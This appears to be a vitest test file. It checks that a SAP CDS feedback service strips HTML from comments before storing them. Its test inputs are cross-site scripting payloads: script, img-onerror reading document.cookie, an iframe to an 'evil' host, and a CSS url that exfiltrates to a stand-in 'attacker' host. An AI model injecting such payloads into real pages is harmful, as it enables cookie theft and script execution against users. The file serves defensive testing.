// #893 — feedback comment must have all HTML stripped server-side before
// storage, so any admin-UI rendering path that treats the column as HTML
// still shows plain text instead of executing injected JS.

import { beforeAll, describe, expect, it } from 'vitest';
import cds from '@sap/cds';

process.env.SUBMISSION_SALT_SECRET = 'test-secret';

cds.test('serve', '--project', '.', '--in-memory');

describe('#893 — submitTutorialFeedback strips HTML from comment', () => {
  let srv;

  let ipCounter = 0;

  beforeAll(async () => {
    srv = await cds.connect.to('DeveloperService');
    srv.before('submitTutorialFeedback', (req) => {
      // Rotate IPs across tests so the 5/hr rate limit doesn't cross-taint.
      ipCounter += 1;
      req.data._clientIp = `10.0.0.${ipCounter}`;
    });

    const { ContentFiles } = cds.entities('com.sap.developers.ims');
    await INSERT.into(ContentFiles).entries([
      { slug: 'demo-t1', version: 1 },
      { slug: 'demo-t2', version: 1 },
      { slug: 'demo-t3', version: 1 },
      { slug: 'demo-t4', version: 1 },
      { slug: 'demo-t5', version: 1 },
      { slug: 'demo-t6', version: 1 },
    ]);
  });

  async function submitAndReadBack(slug, comment) {
    const result = await srv.tx({ user: new cds.User.Privileged() }, tx =>
      tx.send({ event: 'submitTutorialFeedback', data: {
        tutorialSlug: slug, comment, ratingUseCase: 5,
      }})
    );
    const { TutorialFeedback } = cds.entities('com.sap.developers.ims');
    const row = await SELECT.one.from(TutorialFeedback).where({ ID: result.submissionId });
    return row.comment;
  }

  it('strips <script> tags and their contents', async () => {
    const stored = await submitAndReadBack('demo-t1', 'hello<script>alert(1)</script>world');
    expect(stored).not.toContain('<script');
    expect(stored).not.toContain('alert(1)');
    expect(stored).toContain('hello');
    expect(stored).toContain('world');
  });

  it('strips <img onerror=…> tags', async () => {
    const stored = await submitAndReadBack('demo-t2', 'nice tutorial <img src=x onerror="alert(document.cookie)">');
    expect(stored).not.toContain('<img');
    expect(stored).not.toContain('onerror');
    expect(stored).not.toContain('alert');
    expect(stored).toContain('nice tutorial');
  });

  it('strips <iframe> plus contents', async () => {
    const stored = await submitAndReadBack('demo-t3', 'before<iframe src="//evil">malicious</iframe>after');
    expect(stored).not.toContain('<iframe');
    expect(stored).not.toContain('malicious');
    expect(stored).toContain('before');
    expect(stored).toContain('after');
  });

  it('strips <style>…</style> so injected CSS cannot ex-filtrate', async () => {
    const stored = await submitAndReadBack('demo-t4', 'x<style>body{background:url(//attacker/?c=)}</style>y');
    expect(stored).not.toContain('<style');
    expect(stored).not.toContain('attacker');
    expect(stored).toContain('x');
    expect(stored).toContain('y');
  });

  it('encodes bare angle brackets that never formed a tag', async () => {
    const stored = await submitAndReadBack('demo-t5', 'code is a < b < c');
    // No unescaped '<' should remain — attacker cannot smuggle partial tags.
    expect(stored).not.toMatch(/<[a-zA-Z]/);
    expect(stored).toContain('&lt;');
  });

  it('preserves plain-text comments intact', async () => {
    const stored = await submitAndReadBack('demo-t6', 'This tutorial was helpful — thanks!');
    expect(stored).toBe('This tutorial was helpful — thanks!');
  });
});
